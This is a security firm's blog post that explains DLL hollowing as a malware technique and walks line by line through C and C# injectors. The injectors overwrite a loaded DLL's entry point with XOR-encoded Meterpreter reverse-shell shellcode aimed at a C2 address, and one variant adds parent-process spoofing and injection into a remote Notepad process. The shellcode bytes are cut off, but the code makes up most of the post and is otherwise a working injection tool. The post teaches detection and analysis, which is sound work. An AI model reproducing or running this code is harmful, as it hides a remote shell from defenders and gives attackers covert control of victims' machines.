# https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide

- [Blog](https://trustedsec.com/blog)
- [Burrowing a Hollow in a DLL to Hide](https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide)

January 30, 2024

# Burrowing a Hollow in a DLL to Hide

Written by
Scott Nusbaum


Malware Analysis

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1767065217&s=65ac2ebe74109ccddf4b4df996142bd5)

Share

- [Share URL](https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide "Share URL")
- [Share via Email](mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share via Email")
- [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on Facebook")
- [Share on X](http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on X")
- [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&mini=true "Share on LinkedIn")

Share

- [Share URL](https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide "Share URL")
- [Share via Email](mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share via Email")
- [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on Facebook")
- [Share on X](http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on X")
- [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&mini=true "Share on LinkedIn")

## 1    Burrowing a Hollow in a DLL to Hide

In this post about common malware techniques, we are still talking about hollowing—but this time, instead of [hollowing a newly created process](https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe), we will make a process load a new DLL and then overwrite part of that DLL with our malicious code.

We will take two (2) different approaches to DLL hollowing: the first is simpler and the second is more complex. The simpler version will load a DLL into the current process, and the more advanced version will reuse the PPID, spawn a remote process, and then cause that remote process to load the DLL.

As with the previous posts, we will demonstrate these methods in C and C#.

### 1.1      What is DLL Hollowing?

DLL hollowing is a form of process injection, which is when an attacker inserts malicious code into known benign software. With DLL hollowing, the attacker can insert the code into the current process or into a remote process's memory space by loading a new DLL and overwriting sections of its code. The goal of the attacker is to hide from casual analysis. When looking for quick wins, researchers or Incident Response analysts will look for any process or executable that does not look normal. In most use cases, the process and the DLL are both benign. Looking at the file system of the EXE and DLL will show nothing out of the ordinary.

### 1.2      How Does it Work?

In the first scenario, the executable A.exe is started (Note: this doesn't have to be an executable—it could be shell code that executed during an RCE exploit—but for this discussion, it will be an executable). The executable process will then attempt to load a new library (DLL) into its memory space. Once the library has been loaded, the process will then parse the DLL's header information to determine an injection location inside the DLL. Normally, the injection location is the DLL's entry point, but under standard configurations, DllMain is used as the DLL's entry point. Once the entry point has been located, the process will then overwrite the entry point with the malicious code. After the malicious code has been written, a new thread will be created with the entry point as the execution point.

![](https://trusted-sec.files.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/dll_hollowing_basic.gif?dm=1706281316)Figure 1 - Simple DLL Hollowing

The following two (2) images show the libraries that are loaded into the process prior to and after our injection. As you can see, the AMSI.dll was not normally part of the loaded libraries.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281260&s=ed2e2ba22731996bacf3925971da5730)Figure 2 - Libraries Loaded by Default into the Executable

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281261&s=d4226db5279a1215f8f8b179aa4eb3f0)Figure 3 - Loaded Libraries after the Addition of our target amsi.DLL

Next, we will compare the contents of the unmodified amsi.dll entry point to the modified version. The AMSI.dll's entry point is at the address of 0x7ffb0bcde820, and the first image shows the contents of that address directly before the malicious code is moved in. The second image shows the same entry point after the malicious shellcode overwrote it.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281263&s=4bf6f1c8af535ba96ee484a979402c0c)Figure 4 - Original entry point for amsi.dll

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281265&s=d8164434fa3131ca26a3511aff4356ed)Figure 5 - amsi.dll entry point after being Overwritten

This deobfuscated Meterpreter shellcode matches with the above picture.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281267&s=f5ad76203fe0cb90c02841a200c334e2)Figure 6 - Meterpreter Shellcode used to overwrite the amsi.dll entry point

For the second scenario, the executable will start by launching a new process and then obtain a handle for that process. Using this handle, our code will remotely instruct the new process to load a new library into the memory space. Next, our code will iterate through the remote process's loaded modules to obtain the address of the loaded DLL. From there, our code parses the [DLL header](https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files) looking for the entry point. Like the first scenario, we need to determine the entry point of the loaded DLL and overwrite that location with the malicious payload. Finally, once the payload is written, we will then start a remote thread with the function address pointing to the malicious payload.

![](https://trusted-sec.files.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/dll_hollowing_2.gif?dm=1706281308)Figure 7 - DLL Hollowing on a Remote Processes

The two (2) images below demonstrate the list of Notepad's default DLLs followed by the list of DLLs after adding a 'malicious' one (AMSI.dll). By itself, AMSI.dll is not malicious, but it is a DLL that is not normally loaded by this application.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281270&s=e0c47d0409eddac7fa29ad051770716a)Figure 8 - Notepad Default DLL's

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281272&s=ee23d4f72d514432ed55d1a2f5c735c3)Figure 9 - Notepad's DLL list with the Target amsi.dll

### 1.3      What Do the Attackers Gain?

Just like the other [injections methods](https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe) previously discussed, attackers use DLL hollowing to hide the malicious code and execution from casual inspection. If a defender looks at this system, the malware might be overlooked on the first or even the second pass because it is running in a benign executable with a valid parent. In process hollowing, the malware spawns a new process and overwrites a section of memory. In DLL hollowing, a new process is spawned but then instructed to load a new library. This library will appear benign and can be easily overlooked by defenders.

### 1.4      Code Demonstration in C and C\#

The first code sample we will be reviewing is the simple scenario, written in C, that will load the new DLL into the current process and overwrite its entry point before calling create thread to execute the malicious code.

- Lines 19-29: Check the command line parameters for the name of the DLL to use—if none are provided, it will then use the default of AMSI.dll
- Line 34: This is a note instructing use to manually change the C2 IP address
- Line 35-36: Meterpreter reverse shell
- Line 37-74: Continued Meterpreter reverse shellcode but removed for space
- Line 75-80: Used to copy the Meterpreter shellcode into a new memory location
- Line 83: Loads the benign and unneeded DLL into the current process's memory, using the LoadLibrary function call, and returns the address of that memory
- Lines 90-98: Uses the address returned by the LoadLibrary function call to determine the entry point of the DLL by parsing the MZ and PE headers
- Lines 104-107: Modifies the entry point memory region to add the ability to write to this memory
- Line 108: Copies the Meterpreter shellcode to overwrite the original DLL entry point
- Lines 109-112: Sets the entry point memory permissions back to their original value
- Lines 113-118: Uses the CreateThread function to execute the malicious code now stored in the entry point of the DLL

```swift
15	int main(int args, char * argc[])
    16	{
    17	    char dllName[256] = {};
    18
    19	    if(args != 2)
    20	    {
    21	        printf("Usage:: dll_hollowing.exe <dll name>\n");
    22	        memcpy(dllName, "amsi.dll", 9);
    23	    }
    24	    else
    25	    {
    26	        memcpy(dllName, argc[2], strlen(argc[2]));
    27	    }
    28	    printf("C2 IP:\t\t192.168.200.220\nDll Name:\t%s\n",
    29	           dllName);
    30
    34	    // x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP
    35	    unsigned char buff[] =
    36	        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00...
    75	    int encoded_size = sizeof(buff);
    76	    unsigned char * buf =
    77	        (unsigned char *)malloc(encoded_size);
    78	    memset(buf, 0, encoded_size);
    79	    memcpy(buf, buff, encoded_size);
    80	    //    End Shellcode deobfuscation
    81	    // DLL Hollowing
    82	    DWORD saveProtect = 0;
    83	    HMODULE hTargetDLL = LoadLibrary(dllName);
    84	    if(hTargetDLL == NULL)
    85	    {
    86	        printf("[!] LoadLibrary failed to load %s\n",
    87	               dllName);
    88	        return 0;
    89	    }
    90	    PIMAGE_DOS_HEADER mzHeader =
    91	        (PIMAGE_DOS_HEADER)hTargetDLL;
    92	    PIMAGE_NT_HEADERS peHeader =
    93	        (PIMAGE_NT_HEADERS)((char *)hTargetDLL +
    94	                            mzHeader->e_lfanew);
    95	    void * entryPointDLL =
    96	        (void *)((char *)hTargetDLL +
    97	                 peHeader->OptionalHeader
    98	                     .AddressOfEntryPoint);
    99
   100	    printf("%s DLL entrypoint address is (%p)\n",
   101	           dllName,
   102	           entryPointDLL);
   103
   104	    VirtualProtect(entryPointDLL,
   105	                   encoded_size,
   106	                   PAGE_READWRITE,
   107	                   &saveProtect);
   108	    memcpy(entryPointDLL, buf, encoded_size);
   109	    VirtualProtect(entryPointDLL,
   110	                   encoded_size,
   111	                   saveProtect,
   112	                   &saveProtect);
   113	    CreateThread(0,
   114	                 0,
   115	                 (LPTHREAD_START_ROUTINE)entryPointDLL,
   116	                 NULL,
   117	                 0,
   118	                 0);
   119	    printf("Thread Created\n");
   120
   121	    while(true)
   122	    {
   123	        if(getchar() == 'q')
   124	        {
   125	            printf("Recieved an exit command\n");
   126	            break;
   127	        }
   128	    }
   129	    printf("Exiting\n");
   130	    return 1;
   131	}
```

The next code excerpt is in C# and performs the same actions as the above code sample. Let's walk through the code line by line.

- Lines 14-35: Parse the command line input to get the C2 IP and the name of the DLL that will be loaded and overwritten
- Lines 67-95: Processes the shellcode and overwrites the C2 IP address with the value passed in at the command line
- Line 108: Loads the benign DLL into memory using LoadLibrary function all, and stores the address of the DLL into the variable
- Lines 117-126: Uses the address returned by the LoadLibrary function call to determine the entry point of the DLL by parsing the MZ and PE headers
- Line 130: Modifies the entry point memory region to add the ability to write to this memory
- Lines 132-135: Copies the Meterpreter shellcode to overwrite the original DLL entry point
- Line 136: Sets the entry point memory permissions back to their original value
- Line 141 Uses the CreateThread function to execute the malicious code now stored in the entry point of the DLL

```php
14	    unsafe class Program
    15	    {
    16
    17	        static void Main(string[] args)
    18	        {
    19	            String c2_ips = string.Empty;
    20	            String dll_name = string.Empty;
    21	            if (args.Length != 2)
    22	            {
    23	                Console.WriteLine("Usage:: Innject_c2.exe <c2 ip> <dll name>");
    24	                c2_ips = "192.168.49.115";
    25	                dll_name = "amsi.dll";
    26	            }
    27	            else
    28	            {
    29	                c2_ips = args[0];
    30	                dll_name = args[1];
    31	            }
    32	            Console.WriteLine("[*] Using c2 IP of {0}, and dll name {1}", c2_ips, dll_name);
    33
    34				var c2_addr = IPAddress.Parse( c2_ips );
    35
    67	/*************************/
    68	//          Begin Shellcode deobfuscation
    69	/*************************/
    70				byte[] bytes_ip = c2_addr.GetAddressBytes();
    73				// XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP
    74				byte[] encoded = new byte[460] { 0xC9, 0xD1, 0x62, 0xD1, 0x69, 0x9, 0xF5, 0x99, 0xE1, 0x35, 0xD8, 0xB0, 0x74, 0xC9, 0xB3, 0x64, 0xCF, 0xA9,...
    75	            int encoded_size = encoded.Length;
    76	            byte[] xor = new byte[3] { 0x35, 0x99, 0xe1 };
    77	            int xor_size = xor.Length;
    78
    79	            byte[] buf = new byte[encoded_size];
    80				int base_offset = -1;
    81	            for(int i = 0; i < encoded_size; i++)
    82	            {
    83	                buf[i] = (byte)(encoded[i]^xor[i%xor_size]);
    84					if (base_offset == -1 && i > 3 && (buf[i-3]&0xff) == 0xc0 && (buf[i-2]&0xff) == 0xa8 && (buf[i-1]&0xff) == 0xc8 && (buf[i]&0xff) == 0xdc)
    85					{
    86						base_offset = i-3;
    87					}
    88	            }
    89	            for (int offset = 0x0; offset < bytes_ip.Length; offset = offset + 1)
    90	            {
    91	                buf[base_offset + offset] = bytes_ip[offset];
    92	            }
    93	/*************************/
    94	//          End Shellcode deobfuscation
    95	/*************************/
    96
    97	// Loadlibrary(amsi.dll)
    98	// Parse out the entry point to the amsi.dll
    99	// Change memory permissions for the are to allow read write
   100	// Write shellcode to the entry point
   101	// Change memory permissions for the entrypoint to the original value
   102	// Create a new thread executing the entrypoint of the amsi.dll
   103	// Loop for exit. Shellcode only runs when this program is open
   104
   105	/*************************/
   106	// Load the requested Library
   107	/*************************/
   108	            IntPtr hTargetDLL = Utility.Win32.LoadLibrary( dll_name );
   109	            if ( hTargetDLL == IntPtr.Zero)
   110	            {
   111	                Console.WriteLine("[!] LoadLibrary failed to load {0}\n", dll_name);
   112	                return;
   113	            }
   114
   115	            try
   116	            {
   117	                Console.WriteLine("[*] {0} Base Address: 0x{1:X}", dll_name, (Int64)hTargetDLL);
   118	                Utility.Win32.IMAGE_DOS_HEADER *mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)hTargetDLL.ToPointer();
   119	                Console.WriteLine("[*] {0} mz header PE OFffset 0x{1:X}", dll_name, mz_header->e_lfanew);
   120
   121	                Utility.Win32.IMAGE_NT_HEADERS64 *pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((Int64)mz_header + mz_header->e_lfanew);
   122	                Console.WriteLine("[*] {0} pe_header address 0x{1:X}", dll_name, (Int64)pe_header);
   123	                Console.WriteLine("[*] {0} EntryPoint offset 0x{1:X}", dll_name, pe_header->OptionalHeader.AddressOfEntryPoint);
   124
   125	                IntPtr addressOfEntryPoint = new IntPtr( (Int64)mz_header + pe_header->OptionalHeader.AddressOfEntryPoint );
   126	                Console.WriteLine("[*] {0} EntryPoint Address 0x{1:X}", dll_name, (Int64)addressOfEntryPoint);
   127
   128	                uint out1 = 0;
   129
   130	                Utility.Win32.VirtualProtect( addressOfEntryPoint, (UIntPtr)buf.Length, 0x4, out out1 );
   131					Console.WriteLine("[*] {0} Overwriting the entrypoint with shellcode", dll_name);
   132	                fixed (byte *p = buf)
   133	                {
   134	                    Utility.Win32.memcpy(addressOfEntryPoint, (IntPtr)p, (UIntPtr)buf.Length);
   135	                }
   136	                Utility.Win32.VirtualProtect( addressOfEntryPoint, (UIntPtr)buf.Length, out1, out out1);
   137
   138					Console.WriteLine("[*] {0} Sleeping 20 seconds", dll_name);
   139	//                Thread.Sleep(20000);
   140					Console.WriteLine("[*] {0} CreateThread to start shellcode", dll_name);
   141					Utility.Win32.CreateThread( IntPtr.Zero, 0, addressOfEntryPoint, IntPtr.Zero, 0, IntPtr.Zero );
   142	            }
   143	            catch (Exception e)
   144	            {
   145	                Console.Error.WriteLine(e.StackTrace);
   146	            }
   147	            finally
   148	            {
   149
   150	//                Console.WriteLine("{0} started", processInfo.dwProcessId);
   151	            }
   152	        }
   153	    }
```

The next sample we will look through is slightly more complex. In this sample, we will use a couple of tricks from previous blogs to aid in hiding and implement the DLL hollowing in a remote process. Let's walk through the code line by line.

- Lines 11-32: Sets up variables and parses the command line arguments; we require the user to input the IP address of the C2, the parent ID, and the DLL name we want to load into our target process
- Lines 37-103: Processes the Meterpreter shellcode and inserts our new C2 IP address into the shellcode string at runtime
- Lines 110-146: Performing PPID spoofing and spawning the target process (in this case using Notepad)
- Lines 152-167: Sets up the variables needed throughout this program
- Lines 170-175: Allocates memory in the remote process for the DLL name
- Lines 180-184: Writes the name of the DLL into the remote process
- Lines 185-186: Gets the address of the Kernel32 library from the current process because it should be the same address that was used in the remote process (this will be used to get the address of LoadLibrary)
- Lines 187-188: Calls getProcAddress to get the address of the LoadLibrary function—again, this address should be the same in both the local and remote processes
- Lines 189-196: Calls CreateThread using the remote processes handle in order to call the LoadLibrary in that process; the result will map a section of memory for the library we wish to load
- Lines 199: Pauses the execution of the current process to give the remote process a chance to finish loading the DLL
- Lines 202-205: Creates an array of modules (libraries) loaded in the remote process; This array will help us find where our DLL was stored in the memory of the remote process
- Lines 208-220: Loops through the array of modules to identify the names of each module; the names are obtained using GetModuleBaseNameA, and if the modules name matches the DLL we loaded, then we exit the loop
- Lines 223-231: Allocates memory in the current process to hold the MZ/PE header of the DLL loaded in the remote process
- Lines 232-236: Reads the remote processes memory for the MZ/PE header of our loaded DLL
- Lines 237-243: Parses the MZ/PE headers to obtain the address of the DLL's entry point
- Lines 247-251: Overwrites the entry point of the DLL in the remote process with our shellcode
- Lines 254-261: Calls Createthread in the remote process, this time it is calling it with the DLL's entry point as the function; this will cause the thread to execute the shellcode
- Lines 263-271: Cleans up current process's memory and exits

```perl
     9	int main(int args, char * argc[])
    10	{
    11	    char c2_ip_str[16] = {};
    12	    int ppid = 4752;
    13	    char dllInjectName[0x50] = {0};
    14	    DWORD c2_ip = 0;
    15	    if(args != 4)
    16	    {
    17	        printf("Usage:: Inject_c2.exe <c2 ip> <parent id> "
    18	               "<dllName>\n");
    19	        memcpy(c2_ip_str, "192.168.49.115", 15);
    20	        memcpy(dllInjectName, "amsi.dll", 9);
    21	    }
    22	    else
    23	    {
    24	        memcpy(c2_ip_str, argc[1], 15);
    25	        ppid = atoi(argc[2]);
    26	        memcpy(dllInjectName, argc[3], strlen(argc[3]));
    27	    }
    28	    printf("C2 IP = %s, ppid = %d, dllName = %s\n",
    29	           c2_ip_str,
    30	           ppid,
    31	           dllInjectName);
    32	    c2_ip = inet_addr(c2_ip_str);
    33	    /*****************************************/
    34	    //   Begin Shellcode deobfuscation
    35	    /*****************************************/
    36	    // XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP
    37	    char encoded[] =
    38	        "\xC9\xD1\x62\xD1\x69\x9\xF5\x99\xE1\...
    77	    int encoded_size = sizeof(encoded);
    78	    char xor1[] = "\x35\x99\xe1";
    79	    int xor_size = 3;
    80	    char * buf = (char *)malloc(encoded_size);
    81	    int base_offset = -1;
    82	    for(int i = 0; i < encoded_size; i++)
    83	    {
    84	        buf[i] = encoded[i] ^ xor1[i % xor_size];
    85	        if(base_offset == -1 && i > 3 &&
    86	           (buf[i - 3] & 0xff) == 0xc0 &&
    87	           (buf[i - 2] & 0xff) == 0xa8 &&
    88	           (buf[i - 1] & 0xff) == 0xc8 &&
    89	           (buf[i] & 0xff) == 0xdc)
    90	        {
    91	            base_offset = i - 3;
    92	        }
    93	    }
    94	    printf("Found C2 IP at offset at 0x%08x\n",
    95	           base_offset);
    96	    int * tmp = (int *)&buf[base_offset];
    97	    *tmp = c2_ip;
    98	    for(int i = 0; i < encoded_size; i++)
    99	    {
   100	        printf("\\x%02x", buf[i]);
   101	        if((i % 16) == 0 && i > 0)
   102	            printf("\n");
   103	    }
   104	    /*****************************************/
   105	    //    End Shellcode deobfuscation
   106	    /*****************************************/
   107	    /*****************************************/
   108	    // PPID Spoofing
   109	    /*****************************************/
   110	    STARTUPINFOEXA si;
   111	    PROCESS_INFORMATION pi;
   112	    SIZE_T attributeSize;
   113	    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
   114	    HANDLE parentProcessHandle =
   115	        OpenProcess(MAXIMUM_ALLOWED,
   116	                    false,
   117	                    ppid); // Explorer is where notepad is
   118	                           // normally run under
   119	    InitializeProcThreadAttributeList(
   120	        NULL, 1, 0, &attributeSize);
   121	    si.lpAttributeList =
   122	        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
   123	            GetProcessHeap(), 0, attributeSize);
   124	    InitializeProcThreadAttributeList(
   125	        si.lpAttributeList, 1, 0, &attributeSize);
   126	    UpdateProcThreadAttribute(
   127	        si.lpAttributeList,
   128	        0,
   129	        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
   130	        &parentProcessHandle,
   131	        sizeof(HANDLE),
   132	        NULL,
   133	        NULL);
   134	    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
   135	    CreateProcessA(NULL,
   136	                   (LPSTR) "notepad",
   137	                   NULL,
   138	                   NULL,
   139	                   FALSE,
   140	                   EXTENDED_STARTUPINFO_PRESENT |
   141	                       DETACHED_PROCESS,
   142	                   NULL,
   143	                   NULL,
   144	                   &si.StartupInfo,
   145	                   &pi);
   146	    /*****************************************/
   147	    // PPID Spoofing
   148	    /*****************************************/
   149	    /*****************************************/
   150	    // DLL Hollowing
   151	    /*****************************************/
   152	    HANDLE hDllThread = NULL;
   153	    HMODULE module_array[0x100] = {0};
   154	    HMODULE hModule;
   155	    HMODULE hKernel32;
   156	    DWORD module_sz = 0;
   157	    SIZE_T number_of_modules = 0;
   158	    ;
   159	    char moduleName[0x50] = {0};
   160	    void * remoteDLLInjectName = NULL;
   161	    void * remoteProcessMemory = NULL;
   162	    DWORD remoteProcessMemory_sz = 0x1000;
   163	    void * entryPoint = NULL;
   164	    FARPROC loadlibrary_addr = NULL;
   165	    PIMAGE_DOS_HEADER MZ_header = {0};
   166	    PIMAGE_NT_HEADERS PE_header = {0};
   167	    HANDLE hProcess = pi.hProcess;
   168	    // allocate memory, into the remote process memory, for
   169	    // the name of the dll to inject
   170	    remoteDLLInjectName =
   171	        VirtualAllocEx(hProcess,
   172	                       NULL,
   173	                       sizeof(dllInjectName),
   174	                       MEM_COMMIT,
   175	                       PAGE_READWRITE);
   176	    if(remoteDLLInjectName == NULL)
   177	        goto EXIT;
   178	    // copy, into the remote process memory, the name of the
   179	    // dll to inject
   180	    WriteProcessMemory(hProcess,
   181	                       remoteDLLInjectName,
   182	                       dllInjectName,
   183	                       sizeof(dllInjectName),
   184	                       NULL);
   185	    if((hKernel32 = GetModuleHandleA("Kernel32")) == NULL)
   186	        goto EXIT;
   187	    loadlibrary_addr =
   188	        GetProcAddress(hKernel32, "LoadLibraryA");
   189	    hDllThread = CreateRemoteThread(
   190	        hProcess,
   191	        NULL,
   192	        0,
   193	        (PTHREAD_START_ROUTINE)loadlibrary_addr,
   194	        remoteDLLInjectName,
   195	        0,
   196	        NULL);
   197	    if(hDllThread != NULL)
   198	    {
   199	        WaitForSingleObject(hDllThread, 1000);
   200	        // Loop through loaded modules looking for the one we
   201	        // just created
   202	        EnumProcessModules(hProcess,
   203	                           module_array,
   204	                           sizeof(module_array),
   205	                           &module_sz);
   206	        number_of_modules = module_sz / sizeof(HMODULE);
   207	        bool bFound = false;
   208	        for(size_t i = 0; i < number_of_modules; i++)
   209	        {
   210	            hModule = module_array[i];
   211	            GetModuleBaseNameA(hProcess,
   212	                               hModule,
   213	                               moduleName,
   214	                               sizeof(moduleName));
   215	            if(strcmp(moduleName, "amsi.dll") == 0)
   216	            {
   217	                bFound = true;
   218	                break;
   219	            }
   220	        }
   221	    }
   222	    // get DLL's AddressOfEntryPoint
   223	    remoteProcessMemory =
   224	        (void *)VirtualAlloc(NULL,
   225	                             remoteProcessMemory_sz,
   226	                             MEM_COMMIT,
   227	                             PAGE_READWRITE);
   228	    if(remoteProcessMemory == NULL)
   229	    {
   230	        goto EXIT;
   231	    }
   232	    ReadProcessMemory(hProcess,
   233	                      hModule,
   234	                      remoteProcessMemory,
   235	                      remoteProcessMemory_sz,
   236	                      NULL);
   237	    MZ_header = (PIMAGE_DOS_HEADER)remoteProcessMemory;
   238	    PE_header =
   239	        (PIMAGE_NT_HEADERS)((DWORD_PTR)remoteProcessMemory +
   240	                            MZ_header->e_lfanew);
   241	    entryPoint = (LPVOID)(PE_header->OptionalHeader
   242	                              .AddressOfEntryPoint +
   243	                          (DWORD_PTR)hModule);
   244	    printf("[*] Dll entryPoint at: %p\n", entryPoint);
   245	    // Overwrite the DLL's entry point with the decoded
   246	    // shellcode
   247	    if(WriteProcessMemory(hProcess,
   248	                          entryPoint,
   249	                          (LPCVOID)buf,
   250	                          encoded_size,
   251	                          NULL))
   252	    {
   253	        // execute shellcode from inside the benign DLL
   254	        CreateRemoteThread(
   255	            hProcess,
   256	            NULL,
   257	            0,
   258	            (PTHREAD_START_ROUTINE)entryPoint,
   259	            NULL,
   260	            0,
   261	            NULL);
   262	    }
   263	EXIT:
   264	    if(remoteProcessMemory != NULL)
   265	        VirtualFree(remoteProcessMemory,
   266	                    remoteProcessMemory_sz,
   267	                    MEM_RELEASE);
   268	    if(pi.hThread != NULL)
   269	        CloseHandle(pi.hThread);
   270	    if(pi.hProcess != NULL)
   271	        CloseHandle(pi.hProcess);
   272	}
```

The next code excerpt is in C# and performs the same actions as the above code sample. Let's walk through the code line by line.

- Lines 19-34: Processes the user input from the command line; this will obtain the C2 IP address and the name of the DLL where our malicious code will be injected
- Lines 66-94: Processes the shellcode and overwrites the C2 IP address with the value passed in at the command line
- Lines 99-144: Spoofs the parent process ID and executes the new program into which malicious code will be injected (See [this blog](https://trustedsec.com/blog/ppid-spoofing-its-really-this-easy-to-fake-your-parent) for more details on PPID spoofing)
- Line 159: Obtains a handle to the process that we just created, which will be used to determine the DLL address and entry point
- Line 162: Creates a memory space in the newly created program's memory space (This will hold the name of the DLL we wish to load into that process' memory space)
- Line 168: Writes the name of the DLL into the remote process' memory space
- Line 170: Uses GetModuleHandleA to obtain the address of the Kernel32 library loaded into our current process because this memory address will be the same as the remote process
- Line 173: Uses the handle obtained from the GetModuleHandleA function to get the address of the LoadLibrary function
- Line 174: Calls a CreateThread in the remote process to execute the LoadLibrary function and load the DLL into memory; Unlike the previous samples, this LoadLibrary function will not return the address of the DLL since it was created using the CreateThread
- Lines 180-194: Will loop through the remote processes memory to identify the address of the loaded library; EnumProcessModules is used to get the currently loaded processes and GetModuleBaseName is used to get the human readable name of the libraries; when it matches the library we loaded, it will exit
- Lines 197-202: Reads 0x1000 bytes from the remote process' memory space and stores it in the local process' memory; this should contain the MZ and PE headers for the DLL we loaded
- Lines 204-210: Processes the MZ and PE headers obtained from the remote process to determine the entry point
- Line 213: Overwrites the entry point in the remote process with the malicious shellcode
- Line 216: Uses the CreateThread function to execute the malicious code in the remote process

```java
12	namespace dll_hollowing
    13	{
    14	    unsafe class Program
    15	    {
    16
    17	        static void Main(string[] args)
    18	        {
    19	            String c2_ips = string.Empty;
    20	            String dll_name = string.Empty;
    21	            if (args.Length != 2)
    22	            {
    23	                Console.WriteLine("Usage:: Innject_c2.exe <c2 ip> <dll name>");
    24	                c2_ips = "192.168.49.115";
    25	                dll_name = "amsi.dll";
    26	            }
    27	            else
    28	            {
    29	                c2_ips = args[0];
    30	                dll_name = args[1];
    31	            }
    32	            Console.WriteLine("[*] Using c2 IP of {0}, and dll name {1}", c2_ips, dll_name);
    33
    34				var c2_addr = IPAddress.Parse( c2_ips );
    35
    65
    66	/*************************/
    67	//          Begin Shellcode deobfuscation
    68	/*************************/
    69				byte[] bytes_ip = c2_addr.GetAddressBytes();
    72				// XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP
    73				byte[] encoded = new byte[460] { 0xC9, 0xD1, 0x62, 0xD1, 0x69, 0x9, 0xF5, 0x99, ..
    74	            int encoded_size = encoded.Length;
    75	            byte[] xor = new byte[3] { 0x35, 0x99, 0xe1 };
    76	            int xor_size = xor.Length;
    77
    78	            byte[] buf = new byte[encoded_size];
    79				int base_offset = -1;
    80	            for(int i = 0; i < encoded_size; i++)
    81	            {
    82	                buf[i] = (byte)(encoded[i]^xor[i%xor_size]);
    83					if (base_offset == -1 && i > 3 && (buf[i-3]&0xff) == 0xc0 && (buf[i-2]&0xff) == 0xa8 && (buf[i-1]&0xff) == 0xc8 && (buf[i]&0xff) == 0xdc)
    84					{
    85						base_offset = i-3;
    86					}
    87	            }
    88	            for (int offset = 0x0; offset < bytes_ip.Length; offset = offset + 1)
    89	            {
    90	                buf[base_offset + offset] = bytes_ip[offset];
    91	            }
    92	/*************************/
    93	//          End Shellcode deobfuscation
    94	/*************************/
    95
    96	/*************************/
    97	//          Begin PPID Spoofing
    98	/*************************/
    99				var startInfoEx = new Utility.Win32.STARTUPINFOEX();
   100				var processInfo = new Utility.Win32.PROCESS_INFORMATION();
   101				var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
   102	            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
   103
   104	            var processSecurity = new Utility.Win32.SECURITY_ATTRIBUTES();
   105	            var threadSecurity = new Utility.Win32.SECURITY_ATTRIBUTES();
   106	            processSecurity.nLength = Marshal.SizeOf(processSecurity);
